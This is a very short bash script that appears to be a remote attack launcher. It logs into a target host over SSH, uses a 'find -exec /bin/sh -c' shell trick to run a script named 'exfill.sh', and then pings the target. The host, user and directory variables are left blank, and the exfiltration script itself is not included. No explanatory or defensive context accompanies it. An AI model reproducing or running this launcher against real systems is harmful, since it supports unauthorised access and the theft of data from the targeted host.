#!/bin/bash
TARGET_HOST=''
ROOTDIR=''
SSH_USER=''

ssh $SSH_USER@$TARGET_HOST "/usr/bin/find . -exec /bin/sh -c $ROOTDIR/scripts/exfill.sh \; -quit"

ping $TARGET_HOST